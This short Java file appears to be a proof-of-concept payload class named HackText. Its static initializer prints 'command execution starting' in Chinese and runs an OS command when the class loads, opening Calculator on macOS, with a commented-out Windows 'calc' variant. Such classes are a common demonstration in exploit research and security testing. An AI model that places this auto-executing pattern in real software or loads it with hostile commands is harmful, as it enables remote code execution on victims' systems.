package com.fentiaozi.bug;

import java.io.IOException;

/**
 * @description
 * @author: fentiaozi
 * @date 2022/6/2
 */
public class HackText {
    static {
        System.out.println("执行命令开始");
        try {
//                    Process process = Runtime.getRuntime().exec("calc");  //windows
            Process process = Runtime.getRuntime().exec("open /System/Applications/Calculator.app"); //mac
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
